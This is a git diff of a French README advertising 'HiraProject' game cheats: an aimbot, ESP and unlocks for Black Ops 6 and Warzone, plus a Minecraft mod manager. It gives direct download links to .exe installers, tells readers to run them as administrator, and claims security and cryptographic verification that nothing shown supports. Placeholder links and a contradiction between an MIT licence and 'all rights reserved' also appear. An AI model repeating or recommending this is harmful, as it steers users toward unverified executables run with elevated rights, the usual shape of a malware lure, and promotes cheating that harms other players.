@@ -1,41 +1,98 @@
-# HiraProject - Game Enhancements
+# 🎮 HiraProject - Game Enhancements
+
+[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://github.com/HiraProject/hiraproject.github.io/releases)
+[![Discord](https://img.shields.io/discord/YOUR_DISCORD_ID?color=7289da&label=Discord&logo=discord&logoColor=white)](https://discord.gg/votre-lien)
+[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
 
 ![HiraProject Banner](https://your-image-url.com/banner.png)
 
+## 📋 Table des matières
+- [Introduction](#introduction)
+- [Fonctionnalités](#fonctionnalités)
+- [Installation](#installation)
+- [Configuration](#configuration)
+- [Support](#support)
+- [Contribuer](#contribuer)
+- [Communauté](#communauté)
+
 ## ✨ Introduction
-Bienvenue sur **HiraProject**, une plateforme de modifications avancées pour améliorer votre expérience de jeu sur divers titres populaires. Profitez de fonctionnalités comme l'ESP, l'aimbot et bien plus encore.
+Bienvenue sur **HiraProject**, votre solution premium pour l'amélioration de l'expérience de jeu. Notre plateforme offre des modifications avancées et sécurisées pour vos jeux préférés, avec un accent particulier sur la performance et la stabilité.
 
 ## 🔧 Fonctionnalités
-- **Gorilla Loader** : Aimbot, ESP et déverrouillage complet sur Black Ops 6 et Warzone.
-- **Fabric** : Gestion avancée des mods pour Minecraft avec résolution intelligente des dépendances.
-- **Optimisation** : Gestion multicœur pour des performances accrues.
-- **Sécurité** : Vérification cryptographique pour une meilleure protection.
-- **Modularité** : Un système de plugins extensible.
+
+### 🎯 Gorilla Loader
+- **Aimbot Avancé** : Précision améliorée avec personnalisation complète
+- **ESP Premium** : Visualisation des ennemis avec options de personnalisation
+- **Déverrouillage** : Accès à toutes les fonctionnalités premium
+- **Support Multi-Jeux** : Compatible avec Black Ops 6 et Warzone
+- **Mise à jour automatique** : Restez toujours à jour avec les dernières versions
+
+### 🎮 Fabric
+- **Gestionnaire de Mods** : Interface intuitive pour gérer vos mods
+- **Résolution des Dépendances** : Installation automatique des mods requis
+- **Profils de Configuration** : Sauvegardez et partagez vos configurations
+- **Optimisation** : Performance maximale avec gestion multicœur
+- **Système de Plugins** : Extensible selon vos besoins
+
+### 🛡️ Sécurité
+- Vérification cryptographique des fichiers
+- Protection contre les modifications non autorisées
+- Mises à jour de sécurité automatiques
+- Système de sauvegarde intégré
 
 ## 📝 Installation
-1. Téléchargez l'installeur correspondant à votre jeu :
+
+### Prérequis
+- Windows 10/11 64-bit
+- DirectX 12
+- 8GB RAM minimum
+- Connexion Internet stable
+
+### Étapes d'installation
+1. **Téléchargement**
    - [Gorilla Loader](https://github.com/HiraProject/hiraproject.github.io/raw/refs/heads/main/download/gorilla-loader-1.0.0.exe)
    - [Fabric](https://github.com/HiraProject/hiraproject.github.io/raw/refs/heads/main/download/fabric-installer-1.0.1.exe)
-2. Exécutez le fichier et suivez les instructions à l'écran.
-3. Profitez d'une expérience de jeu améliorée !
 
-## 🔄 Mises à Jour
-Restez informé des dernières versions et améliorations en consultant notre [site officiel](https://hiraproject.github.io) ou notre [GitHub](https://github.com/HiraProject).
+2. **Installation**
+   - Exécutez l'installateur en tant qu'administrateur
+   - Suivez l'assistant d'installation
+   - Redémarrez votre ordinateur si nécessaire
 
-## 🛡️ Support & Sécurité
-- Pour toute question ou assistance, rendez-vous sur notre section [Support](#support).
-- Nous prenons la sécurité au sérieux : nos programmes sont régulièrement vérifiés.
+3. **Configuration initiale**
+   - Lancez l'application
+   - Configurez vos préférences
+   - Vérifiez les mises à jour
 
-## ⚙ Contribuer
-Vous souhaitez contribuer ?
-- Forkez le projet
-- Proposez des améliorations via des pull requests
-- Partagez vos idées dans les issues
+## ⚙️ Configuration
+- Interface utilisateur personnalisable
+- Raccourcis clavier configurables
+- Thèmes visuels disponibles
+- Options de performance avancées
 
-## 🚀 Rejoignez la Communauté
-Rejoignez-nous sur :
+## 🛡️ Support
+Besoin d'aide ? Notre équipe est là pour vous :
+- **Discord** : [Rejoignez notre serveur](https://discord.gg/votre-lien)
+- **Email** : support@hiraproject.com
+- **Documentation** : [Wiki](https://wiki.hiraproject.com)
+- **FAQ** : [Questions fréquentes](https://faq.hiraproject.com)
+
+## 🤝 Contribuer
+Nous accueillons les contributions de la communauté :
+1. Forkez le projet
+2. Créez une branche (`git checkout -b feature/AmazingFeature`)
+3. Committez vos changements (`git commit -m 'Add some AmazingFeature'`)
+4. Poussez vers la branche (`git push origin feature/AmazingFeature`)
+5. Ouvrez une Pull Request
+
+## 🌟 Communauté
+Rejoignez notre communauté dynamique :
 - [Discord](https://discord.gg/votre-lien)
 - [Twitter](https://twitter.com/HiraProject)
+- [YouTube](https://youtube.com/HiraProject)
+- [Reddit](https://reddit.com/r/HiraProject)
+
+## 📜 Licence
+Ce projet est sous licence MIT - voir le fichier [LICENSE](LICENSE) pour plus de détails.
 
 ---
 © 2025 HiraProject. Tous droits réservés.
